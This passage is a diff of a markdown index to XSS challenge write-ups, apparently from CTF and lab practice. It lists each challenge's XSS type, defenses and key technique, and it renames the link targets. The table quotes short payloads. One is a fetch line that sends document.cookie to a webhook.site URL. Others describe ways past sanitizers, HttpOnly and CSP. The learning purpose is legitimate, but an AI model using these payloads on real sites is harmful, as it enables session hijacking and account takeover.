@@ -6,17 +6,17 @@ XSS challenges spanning reflected, stored, and DOM-based vectors, with progressi
 
 | challenge | xss type | defenses present | key technique |
 |---|---|---|---|
-| [portswigger - Reflected XSS](<portswigger - Reflected XSS into HTML context.md>) | reflected | none | Basic `<script>alert(1)</script>` in HTML context |
-| [Segnalazione cinghiali - Attribute Context](<Segnalazione cinghiali cittadini - Attribute Context XSS.md>) | reflected | none | `" onmouseover="...` breaks out of attribute; event handler fires |
-| [ScratchPad - JS String Context](<ScratchPad - Stored XSS via JavaScript String Context.md>) | stored | none | `'; payload;//` closes string literal, injects JS |
-| [Guestbook - javascript: URI Bypass](<Guestbook - XSS via javascript, URI Sanitizer Bypass.md>) | stored | sanitizer | `javascript:` URI survives sanitization; executes on click |
-| [Curious George - Cookie Theft](<Curious George - stored XSS and cookie theft.md>) | stored | proof-of-work rate limit | `fetch('https://webhook.site/...?c='+document.cookie)` exfiltrates cookie |
-| [Bibbopedia 2 - Action as Victim](<Bibbopedia 2 - Stored XSS.md>) | stored | HttpOnly cookies | `onerror` handler clicks the admin approval button — action as victim bypasses HttpOnly |
-| [RecipeBox - SSRF + Reflected XSS](<RecipeBox - SSRF + Reflected XSS and Cookie Theft.md>) | reflected | none | SSRF triggers server to visit a page; reflected XSS on that page steals the server-side cookie |
-| [PigeonPost - postMessage Bypass](<PigeonPost - postMessage Origin Bypass and javascript URI Cookie Theft.md>) | DOM | none | `postMessage` handler lacks origin check; inject `javascript:` payload to steal cookie |
-| [PicShare - SVG Upload XSS](<PicShare - Stored XSS via SVG Upload and Missing X-Content-Type-Options.md>) | stored, file upload | none | SVG avatar served without `X-Content-Type-Options`; browser executes embedded `<script>` |
-| [Virtualbank - CSP 'self' Bypass](<Virtualbank - CSP 'self' bypass.md>) | stored | CSP with `'self'` | Same-origin script injection route circumvents `script-src 'self'` |
-| [Private Notes - CSP Nonce Predictability](<Private Notes - CSP nonce predictability.md>) | stored | CSP with nonce | Nonce is predictable or reusable; forged `<script nonce="...">` passes CSP |
+| [portswigger](portswigger.md) | reflected | none | Basic `<script>alert(1)</script>` in HTML context |
+| [Segnalazione cinghiali cittadini](segnalazione-cinghiali-cittadini.md) | reflected | none | `" onmouseover="...` breaks out of attribute; event handler fires |
+| [ScratchPad](scratchpad.md) | stored | none | `'; payload;//` closes string literal, injects JS |
+| [Guestbook](guestbook.md) | stored | sanitizer | `javascript:` URI survives sanitization; executes on click |
+| [Curious George](curious-george.md) | stored | proof-of-work rate limit | `fetch('https://webhook.site/...?c='+document.cookie)` exfiltrates cookie |
+| [Bibbopedia 2](bibbopedia-2.md) | stored | HttpOnly cookies | `onerror` handler clicks the admin approval button — action as victim bypasses HttpOnly |
+| [RecipeBox](recipebox.md) | reflected | none | SSRF triggers server to visit a page; reflected XSS on that page steals the server-side cookie |
+| [PigeonPost](pigeonpost.md) | DOM | none | `postMessage` handler lacks origin check; inject `javascript:` payload to steal cookie |
+| [PicShare](picshare.md) | stored, file upload | none | SVG avatar served without `X-Content-Type-Options`; browser executes embedded `<script>` |
+| [Virtualbank](virtualbank.md) | stored | CSP with `'self'` | Same-origin script injection route circumvents `script-src 'self'` |
+| [Private Notes](private-notes.md) | stored | CSP with nonce | Nonce is predictable or reusable; forged `<script nonce="...">` passes CSP |
 
 ## Cookie Theft Payloads
 
